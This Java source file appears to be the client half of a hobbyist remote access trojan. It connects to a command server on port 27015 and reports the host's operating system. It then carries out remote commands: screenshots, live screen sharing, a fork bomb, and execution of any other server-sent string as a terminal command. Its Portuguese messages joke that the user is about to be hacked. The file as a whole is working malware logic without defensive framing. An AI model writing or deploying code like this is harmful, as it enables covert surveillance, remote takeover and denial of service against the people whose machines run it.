package app;

import exception.ServerOfflineException;
import network.Connection;
import network.Message;
import utils.Bomb;
import utils.ClientUtils;
import utils.OsCheck;
import utils.ScreenUtils;

import java.io.IOException;
import java.net.Socket;

public class Client {
    static Connection connection;
    static OsCheck.OSType MY_OS;
    static boolean isConnected = false;

    public static void main(String[] args) {
        System.out.println("Opa ta na hora de ser haskiado");
        while (true) {
            try {
                beginConnection();
            } catch (ServerOfflineException e) {
                System.out.println("Server desligou agora negao");
            }
        }
    }

    private static void beginConnection() throws ServerOfflineException {
        try {
            connection = new Connection(new Socket("localhost", 27015));
            isConnected = true;
            System.out.println("Connected, boii");
        } catch (IOException e) {
            System.out.println("Server is offline");
            disconnected();
            return;
        }

        MY_OS = OsCheck.getOperatingSystemType();

        Message osMessage = new Message("print", "User is using " + MY_OS.name());
        connection.sendMessage(osMessage);

        while (true) {
            handleServerCommand();
        }

    }

    private static void handleServerCommand() throws ServerOfflineException {
        String command = connection.readMessage().getCommand();

        switch (command) {
            case "screen":
                ScreenUtils.sendScreenshot(connection, false);
                break;
            case "start-screenshare":
                ScreenUtils.startScreenShare(connection);
                break;
            case "stop-screenshare":
                ScreenUtils.stopScreenShare();
                break;
            case "bomb":
                try {
                    Bomb.explode();
                } catch (IOException e) {
                    connection.sendMessage(new Message("print", "ForkBomb failed: " + e.getMessage()));
                }
                break;
            default:
                ClientUtils.runTerminalCommand(MY_OS, command, connection);
        }
    }

    public static void disconnected() {
        isConnected = false;
    }
}
